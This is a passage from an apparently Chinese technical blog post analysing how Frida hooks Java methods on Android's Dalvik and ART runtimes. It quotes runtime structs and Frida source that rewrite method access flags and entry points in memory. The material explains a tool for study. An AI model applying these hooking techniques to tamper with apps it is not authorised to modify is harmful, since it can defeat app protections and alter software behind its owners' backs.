class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//https://android.googlesource.com/platform/dalvik/+/6d874d2bda563ada1034d2b3219b35d800fc6860/vm/oo/Object.h#418</span><br><span class="line">struct Method &#123;   </span><br><span class="line">    ClassObject*    clazz;   /* method所属的类 public、native等*/</span><br><span class="line">    u4              accessFlags; /* 访问标记 */</span><br><span class="line">    u2             methodIndex; //method索引</span><br><span class="line">    //三个size为边界值，对于native函数，这3个size均等于参数列表的size</span><br><span class="line">    u2              registersSize;  /* ins + locals */</span><br><span class="line">    u2              outsSize;</span><br><span class="line">    u2              insSize;</span><br><span class="line">    const char*     name;//函数名称</span><br><span class="line">    /*</span><br><span class="line">     * Method prototype descriptor string (return and argument types)</span><br><span class="line">     */</span><br><span class="line">    DexProto        prototype;</span><br><span class="line">    /* short-form method descriptor string */</span><br><span class="line">    const char*     shorty;</span><br><span class="line">    /*</span><br><span class="line">     * The remaining items are not used for abstract or native methods.</span><br><span class="line">     * (JNI is currently hijacking &quot;insns&quot; as a function pointer, set</span><br><span class="line">     * after the first call.  For internal-native this stays null.)</span><br><span class="line">     */</span><br><span class="line">    /* the actual code */</span><br><span class="line">    const u2*       insns;          /* instructions, in memory-mapped .dex */</span><br><span class="line">    /* cached JNI argument and return-type hints */</span><br><span class="line">    int             jniArgInfo;</span><br><span class="line">    /*</span><br><span class="line">     * Native method ptr; could be actual function or a JNI bridge.  We</span><br><span class="line">     * don&apos;t currently discriminate between DalvikBridgeFunc and</span><br><span class="line">     * DalvikNativeFunc; the former takes an argument superset (i.e. two</span><br><span class="line">     * extra args) which will be ignored.  If necessary we can use</span><br><span class="line">     * insns==NULL to detect JNI bridge vs. internal native.</span><br><span class="line">     */</span><br><span class="line">    DalvikBridgeFunc nativeFunc;</span><br><span class="line">    /*</span><br><span class="line">     * Register map data, if available.  This will point into the DEX file</span><br><span class="line">     * if the data was computed during pre-verification, or into the</span><br><span class="line">     * linear alloc area if not.</span><br><span class="line">     */</span><br><span class="line">    const RegisterMap* registerMap;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>replaceDalvikImplementation修改了method中的accessFlags、registersSize、outsSize、insSize和jniArgInfo，将原java函数对应的结构体修改为一个native函数，并调用dvmUseJNIBridge（<a href=",参考http://androidxref.com/4.4.2_r2/xref/dalvik/vm/Jni.cpp#806">dvmUseJNIBridge实现代码</a>）为这个Method设置一个Bridge，改变结构体中的nativeFunc，指向自定义的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function replaceDalvikImplementation (fn) &#123;</span><br><span class="line">  if (fn === null &amp;&amp; dalvikOriginalMethod === null) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">//备份原来的method,</span><br><span class="line">  if (dalvikOriginalMethod === null) &#123;</span><br><span class="line">    dalvikOriginalMethod = Memory.dup(methodId, DVM_METHOD_SIZE);</span><br><span class="line">    dalvikTargetMethodId = Memory.dup(methodId, DVM_METHOD_SIZE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (fn !== null) &#123;</span><br><span class="line">   //自定的代码</span><br><span class="line">    implementation = implement(f, fn);</span><br><span class="line"></span><br><span class="line">    let argsSize = argTypes.reduce((acc, t) =&gt; (acc + t.size), 0);</span><br><span class="line">    if (type === INSTANCE_METHOD) &#123;</span><br><span class="line">      argsSize++;</span><br><span class="line">    &#125;</span><br><span class="line">    // 把method变成native函数</span><br><span class="line">    /*</span><br><span class="line">     * make method native (with kAccNative)</span><br><span class="line">     * insSize and registersSize are set to arguments size</span><br><span class="line">     */</span><br><span class="line">    const accessFlags = (Memory.readU32(methodId.add(DVM_METHOD_OFFSET_ACCESS_FLAGS)) | kAccNative) &gt;&gt;&gt; 0;</span><br><span class="line">    const registersSize = argsSize;</span><br><span class="line">    const outsSize = 0;</span><br><span class="line">    const insSize = argsSize;</span><br><span class="line"></span><br><span class="line">    Memory.writeU32(methodId.add(DVM_METHOD_OFFSET_ACCESS_FLAGS), accessFlags);</span><br><span class="line">    Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_REGISTERS_SIZE), registersSize);</span><br><span class="line">    Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_OUTS_SIZE), outsSize);</span><br><span class="line">    Memory.writeU16(methodId.add(DVM_METHOD_OFFSET_INS_SIZE), insSize);</span><br><span class="line">    Memory.writeU32(methodId.add(DVM_METHOD_OFFSET_JNI_ARG_INFO), computeDalvikJniArgInfo(methodId));</span><br><span class="line">    //调用dvmUseJNIBridge为这个Method设置一个Bridge,本质上是修改结构体中的nativeFunc为自定义的implementation函数</span><br><span class="line">    api.dvmUseJNIBridge(methodId, implementation);</span><br><span class="line"></span><br><span class="line">    patchedMethods.add(f);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    patchedMethods.delete(f);</span><br><span class="line"></span><br><span class="line">    Memory.copy(methodId, dalvikOriginalMethod, DVM_METHOD_SIZE);</span><br><span class="line">    implementation = null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>自定义的js代码如何生成？<br>implement的实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">function implement (method, fn) &#123;</span><br><span class="line">  if (method.hasOwnProperty(&apos;overloads&apos;)) &#123;</span><br><span class="line">    throw new Error(&apos;Only re-implementing a concrete (specific) method is possible, not a method &quot;dispatcher&quot;&apos;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const C = method.holder; // eslint-disable-line</span><br><span class="line">  const type = method.type;</span><br><span class="line">  const retType = method.returnType;</span><br><span class="line">  const argTypes = method.argumentTypes;</span><br><span class="line">  const methodName = method.methodName;</span><br><span class="line">  const rawRetType = retType.type;</span><br><span class="line">  const rawArgTypes = argTypes.map((t) =&gt; (t.type));</span><br><span class="line">  const pendingCalls = method[PENDING_CALLS]; // eslint-disable-line</span><br><span class="line"></span><br><span class="line">  let frameCapacity = 2;</span><br><span class="line">  const argVariableNames = argTypes.map((t, i) =&gt; (&apos;a&apos; + (i + 1)));</span><br><span class="line">  const callArgs = argTypes.map((t, i) =&gt; &#123;</span><br><span class="line">    if (t.fromJni) &#123;</span><br><span class="line">      frameCapacity++;</span><br><span class="line">      return [&apos;argTypes[&apos;, i, &apos;].fromJni.call(self, &apos;, argVariableNames[i], &apos;, env)&apos;].join(&apos;&apos;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return argVariableNames[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  let returnCapture, returnStatements, returnNothing;</span><br><span class="line">  if (rawRetType === &apos;void&apos;) &#123;</span><br><span class="line">    returnCapture = &apos;&apos;;</span><br><span class="line">    returnStatements = &apos;env.popLocalFrame(NULL);&apos;;</span><br><span class="line">    returnNothing = &apos;return;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    if (retType.toJni) &#123;</span><br><span class="line">      frameCapacity++;</span><br><span class="line">      returnCapture = &apos;result = &apos;;</span><br><span class="line">      returnStatements = &apos;var rawResult;&apos; +</span><br><span class="line">        &apos;try &#123;&apos; +</span><br><span class="line">        &apos;if (retType.isCompatible.call(this, result)) &#123;&apos; +</span><br><span class="line">        &apos;rawResult = retType.toJni.call(this, result, env);&apos; +</span><br><span class="line">        &apos;&#125; else &#123;&apos; +</span><br><span class="line">        &apos;throw new Error(&quot;Implementation for &quot; + methodName + &quot; expected return value compatible with \&apos;&quot; + retType.className + &quot;\&apos;.&quot;);&apos; +</span><br><span class="line">        &apos;&#125;&apos;;</span><br><span class="line">      if (retType.type === &apos;pointer&apos;) &#123;</span><br><span class="line">        returnStatements += &apos;&#125; catch (e) &#123;&apos; +</span><br><span class="line">          &apos;env.popLocalFrame(NULL);&apos; +</span><br><span class="line">          &apos;throw e;&apos; +</span><br><span class="line">          &apos;&#125;&apos; +</span><br><span class="line">          &apos;return env.popLocalFrame(rawResult);&apos;;</span><br><span class="line">        returnNothing = &apos;return NULL;&apos;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        returnStatements += &apos;&#125; finally &#123;&apos; +</span><br><span class="line">          &apos;env.popLocalFrame(NULL);&apos; +</span><br><span class="line">          &apos;&#125;&apos; +</span><br><span class="line">          &apos;return rawResult;&apos;;</span><br><span class="line">        returnNothing = &apos;return 0;&apos;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      returnCapture = &apos;result = &apos;;</span><br><span class="line">      returnStatements = &apos;env.popLocalFrame(NULL);&apos; +</span><br><span class="line">        &apos;return result;&apos;;</span><br><span class="line">      returnNothing = &apos;return 0;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  let f;</span><br><span class="line">  eval(&apos;f = function (&apos; + [&apos;envHandle&apos;, &apos;thisHandle&apos;].concat(argVariableNames).join(&apos;, &apos;) + &apos;) &#123;&apos; + // eslint-disable-line</span><br><span class="line">    &apos;var env = new Env(envHandle, vm);&apos; +</span><br><span class="line">    &apos;if (env.pushLocalFrame(&apos; + frameCapacity + &apos;) !== JNI_OK) &#123;&apos; +</span><br><span class="line">    &apos;return;&apos; +</span><br><span class="line">    &apos;&#125;&apos; +</span><br><span class="line">    &apos;var self = &apos; + ((type === INSTANCE_METHOD) ? &apos;new C(thisHandle);&apos; : &apos;new C(null);&apos;) +</span><br><span class="line">    &apos;var result;&apos; +</span><br><span class="line">    &apos;var tid = Process.getCurrentThreadId();&apos; +</span><br><span class="line">    &apos;try &#123;&apos; +</span><br><span class="line">    &apos;pendingCalls.add(tid);&apos; +</span><br><span class="line">    &apos;if (ignoredThreads[tid] === undefined) &#123;&apos; +</span><br><span class="line">    returnCapture + &apos;fn.call(&apos; + [&apos;self&apos;].concat(callArgs).join(&apos;, &apos;) + &apos;);&apos; +</span><br><span class="line">    &apos;&#125; else &#123;&apos; +</span><br><span class="line">    returnCapture + &apos;method.call(&apos; + [&apos;self&apos;].concat(callArgs).join(&apos;, &apos;) + &apos;);&apos; +</span><br><span class="line">    &apos;&#125;&apos; +</span><br><span class="line">    &apos;&#125; catch (e) &#123;&apos; +</span><br><span class="line">    &apos;env.popLocalFrame(NULL);&apos; +</span><br><span class="line">    &quot;if (typeof e === &apos;object&apos; &amp;&amp; e.hasOwnProperty(&apos;$handle&apos;)) &#123;&quot; +</span><br><span class="line">    &apos;env.throw(e.$handle);&apos; +</span><br><span class="line">    returnNothing +</span><br><span class="line">    &apos;&#125; else &#123;&apos; +</span><br><span class="line">    &apos;throw e;&apos; +</span><br><span class="line">    &apos;&#125;&apos; +</span><br><span class="line">    &apos;&#125; finally &#123;&apos; +</span><br><span class="line">    &apos;pendingCalls.delete(tid);&apos; +</span><br><span class="line">    &apos;&#125;&apos; +</span><br><span class="line">    returnStatements +</span><br><span class="line">    &apos;&#125;;&apos;);</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(f, &apos;methodName&apos;, &#123;</span><br><span class="line">    enumerable: true,</span><br><span class="line">    value: methodName</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(f, &apos;type&apos;, &#123;</span><br><span class="line">    enumerable: true,</span><br><span class="line">    value: type</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(f, &apos;returnType&apos;, &#123;</span><br><span class="line">    enumerable: true,</span><br><span class="line">    value: retType</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(f, &apos;argumentTypes&apos;, &#123;</span><br><span class="line">    enumerable: true,</span><br><span class="line">    value: argTypes</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  Object.defineProperty(f, &apos;canInvokeWith&apos;, &#123;</span><br><span class="line">    enumerable: true,</span><br><span class="line">    value: function (args) &#123;</span><br><span class="line">      if (args.length !== argTypes.length) &#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return argTypes.every((t, i) =&gt; (t.isCompatible(args[i])));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  return new NativeCallback(f, rawRetType, [&apos;pointer&apos;, &apos;pointer&apos;].concat(rawArgTypes));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在自定义的代码里调用原函数？</p><h5 id="ART-hook实现"><a href="#ART-hook实现" class="headerlink" title="ART hook实现"></a>ART hook实现</h5><p>frida的ART hook实现也是把java method转为native method, 但ART的运行机制不同于Dalvik, 其实现也较为复杂，这里从ART运行机制开始解释。</p><p>ART 是一种代替 Dalivk 的新的运行时,它具有更高的执行效率。ART虚拟机执行 Java 方法主要有两种模式：quick code 模式和 Interpreter 模式。</p><ul><li>quick code 模式：执行 arm 汇编指令</li><li>Interpreter 模式：由解释器解释执行 Dalvik 字节码</li></ul><p>即使是在quick code模式中，也有类方法可能需要以Interpreter模式执行。反之亦然。解释执行的类方法通过函数artInterpreterToCompiledCodeBridge的返回值调用本地机器指令执行的类方法；本地机器指令执行的类方法通过函数GetQuickToInterpreterBridge的返回值调用解释执行的类方法；</p><p>ART中的每一个函数都对应一个ARTMethod结构体，其中entry_point_from<em>interpreter</em>和entry_point_from_quick_compiled<em>code</em>分别表示两种模式的调用入口<br>ARTMethod结构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">//http://androidxref.com/8.1.0_r33/xref/art/runtime/art_method.h#708</span><br><span class="line">class ArtMethod &#123;</span><br><span class="line"> </span><br><span class="line">  GcRoot&lt;mirror::Class&gt; declaring_class_; //method所属的class</span><br><span class="line"></span><br><span class="line">  // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. </span><br><span class="line">  GcRoot&lt;mirror::PointerArray&gt; dex_cache_resolved_methods_;</span><br><span class="line"></span><br><span class="line">  // Short cuts to declaring_class_-&gt;dex_cache_ member for fast compiled code access. </span><br><span class="line">  GcRoot&lt;mirror::ObjectArray&lt;mirror::Class&gt;&gt; dex_cache_resolved_types_;</span><br><span class="line"></span><br><span class="line">  // Access flags; low 16 bits are defined by spec. </span><br><span class="line">  uint32_t access_flags_;</span><br><span class="line"></span><br><span class="line">  /* Dex file fields. The defining dex file is available via declaring_class_-&gt;dex_cache_ */</span><br><span class="line"></span><br><span class="line">  // Offset to the CodeItem. </span><br><span class="line">  uint32_t dex_code_item_offset_;</span><br><span class="line"></span><br><span class="line">  // Index into method_ids of the dex file associated with this method. </span><br><span class="line">  uint32_t dex_method_index_;</span><br><span class="line"></span><br><span class="line">  /* End of dex file fields. */</span><br><span class="line"></span><br><span class="line">  // Entry within a dispatch table for this method. For static/direct methods the index is into </span><br><span class="line">  // the declaringClass.directMethods, for virtual methods the vtable and for interface methods the </span><br><span class="line">  // ifTable. </span><br><span class="line">  uint32_t method_index_;</span><br><span class="line"></span><br><span class="line">  // Fake padding field gets inserted here. </span><br><span class="line">  // Must be the last fields in the method. </span><br><span class="line">  // PACKED(4) is necessary for the correctness of </span><br><span class="line">  // RoundUp(OFFSETOF_MEMBER(ArtMethod, ptr_sized_fields_), pointer_size). </span><br><span class="line">  struct PACKED(4) PtrSizedFields &#123;</span><br><span class="line"></span><br><span class="line">    // Method dispatch from the interpreter invokes this pointer which may cause a bridge into </span><br><span class="line">    // 以interpreter模式调用入口</span><br><span class="line">    void* entry_point_from_interpreter_; </span><br><span class="line">    void* entry_point_from_jni_; //jni函数入口</span><br><span class="line"></span><br><span class="line">    // 以quick code调用时的函数入口</span><br><span class="line">    void* entry_point_from_quick_compiled_code_;</span><br><span class="line">  &#125; ptr_sized_fields_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ART的执行流程如下图：</p><p><img src="/images/pasted-84.png" alt="upload successful"></p><p>如图所示，对于一个native method, ART虚拟机首先会尝试quickcode模式执行，检查ARTMethod结构中的entry_point_from_quick_compiled<em>code</em>成员，这里分3种情况：</p><ol><li><p>如果函数已经存在quick code, 则指向这个函数对应的 quick code的起始地址，而当quick code不存在时，它的值则会代表其他的意义；</p></li><li><p>当一个 java 函数不存在 quick code时，它的值是函数 artQuickToInterpreterBridge 的地址，用以从 quick 模式切换到 Interpreter 模式来解释执行 java 函数代码；</p></li><li><p>当一个 java native（JNI）函数不存在 quick code时，它的值是函数 art_quick_generic_jni_trampoline 的地址，用以执行没有quick code的 jni 函数；</p></li></ol><p>因此，如果frida把一个java method改为jni method, 显然是不存在quick code，这时需要将entry_point_from_quick_compiled<em>code</em>值修改为art_quick_generic_jni_trampoline 的地址。</p><p>art_quick_generic_jni_trampoline函数实现比较复杂（<a href="https://blog.csdn.net/sinat_38172893/article/details/74612596" target="_blank" rel="noopener">代码分析</a>)，主要负责jni调用的准备，包括堆栈的设置，参数的设置等,该函数最终会调到entry_point_from<em>jni</em>，即jni函数的入口。</p><p>因此，frida把java method改为jni method，需要修改ARTMethod结构体中的这几个值：<br>access<em>flags</em> = native<br>entry_point_from<em>jni</em> = 自定义代码的入口<br>entry_point_from_quick_compiled<em>code</em> = art_quick_generic_jni_trampoline函数的地址<br>entry_point_from<em>interpreter</em> = artInterpreterToCompiledCodeBridge函数地址</p><p>frida对ARTMethod的修改在replaceArtImplementation函数中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">patchMethod(methodId, &#123;</span><br><span class="line">  //jnicode入口entry_point_from_jni_改为自定义的代码</span><br><span class="line">  &apos;jniCode&apos;: implementation,</span><br><span class="line">  //修改为access_flags_为native</span><br><span class="line">  &apos;accessFlags&apos;: (Memory.readU32(methodId.add(artMethodOffset.accessFlags)) | kAccNative | kAccFastNative) &gt;&gt;&gt; 0,</span><br><span class="line">  //entry_point_from_quick_compiled_code_</span><br><span class="line">  &apos;quickCode&apos;: api.artQuickGenericJniTrampoline,</span><br><span class="line">  //entry_point_from_interpreter_</span><br><span class="line">  &apos;interpreterCode&apos;: api.artInterpreterToCompiledCodeBridge</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>patchMethod实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function patchMethod (methodId, patches) &#123;</span><br><span class="line">  const artMethodSpec = getArtMethodSpec(vm);</span><br><span class="line">  const artMethodOffset = artMethodSpec.offset;</span><br><span class="line">  Object.keys(patches).forEach(name =&gt; &#123;</span><br><span class="line">    const offset = artMethodOffset[name];</span><br><span class="line">    if (offset === undefined) &#123;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">    const address = methodId.add(offset);</span><br><span class="line">    const suffix = (name === &apos;accessFlags&apos; ? &apos;U32&apos; : &apos;Pointer&apos;);</span><br><span class="line">    Memory[&apos;write&apos; + suffix](address, patches[name]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>getArtMethodSpec实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">function _getArtMethodSpec (vm) &#123;</span><br><span class="line">  const api = getApi();</span><br><span class="line">  let spec;</span><br><span class="line"></span><br><span class="line">  vm.perform(() =&gt; &#123;</span><br><span class="line">    const env = vm.getEnv();</span><br><span class="line">    const process = env.findClass(&apos;android/os/Process&apos;);</span><br><span class="line">    const setArgV0 = env.getStaticMethodId(process, &apos;setArgV0&apos;, &apos;(Ljava/lang/String;)V&apos;);</span><br><span class="line"></span><br><span class="line">    const runtimeModule = Process.getModuleByName(&apos;libandroid_runtime.so&apos;);</span><br><span class="line">    const runtimeStart = runtimeModule.base;</span><br><span class="line">    const runtimeEnd = runtimeStart.add(runtimeModule.size);</span><br><span class="line"></span><br><span class="line">    const apiLevel = getAndroidApiLevel();</span><br><span class="line"></span><br><span class="line">    const entrypointFieldSize = (apiLevel &lt;= 21) ? 8 : pointerSize;</span><br><span class="line"></span><br><span class="line">    const expectedAccessFlags = kAccPublic | kAccStatic | kAccFinal | kAccNative;</span><br><span class="line"></span><br><span class="line">    let jniCodeOffset = null;</span><br><span class="line">    let accessFlagsOffset = null;</span><br><span class="line">    let remaining = 2;</span><br><span class="line">    for (let offset = 0; offset !== 64 &amp;&amp; remaining !== 0; offset += 4) &#123;</span><br><span class="line">      const field = setArgV0.add(offset);</span><br><span class="line"></span><br><span class="line">      if (jniCodeOffset === null) &#123;</span><br><span class="line">        const address = Memory.readPointer(field);</span><br><span class="line">        if (address.compare(runtimeStart) &gt;= 0 &amp;&amp; address.compare(runtimeEnd) &lt; 0) &#123;</span><br><span class="line">          jniCodeOffset = offset;</span><br><span class="line">          remaining--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if (accessFlagsOffset === null) &#123;</span><br><span class="line">        const flags = Memory.readU32(field);</span><br><span class="line">        if (flags === expectedAccessFlags) &#123;</span><br><span class="line">          accessFlagsOffset = offset;</span><br><span class="line">          remaining--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (remaining !== 0) &#123;</span><br><span class="line">      throw new Error(&apos;Unable to determine ArtMethod field offsets&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const quickCodeOffset = jniCodeOffset + entrypointFieldSize;</span><br><span class="line"></span><br><span class="line">    const size = (apiLevel &lt;= 21) ? (quickCodeOffset + 32) : (quickCodeOffset + pointerSize);</span><br><span class="line"></span><br><span class="line">    spec = &#123;</span><br><span class="line">      size: size,</span><br><span class="line">      offset: &#123;</span><br><span class="line">        jniCode: jniCodeOffset,</span><br><span class="line">        quickCode: quickCodeOffset,</span><br><span class="line">        accessFlags: accessFlagsOffset</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    if (&apos;artInterpreterToCompiledCodeBridge&apos; in api) &#123;</span><br><span class="line">      spec.offset.interpreterCode = jniCodeOffset - entrypointFieldSize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  return spec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考：</p><ol><li><a 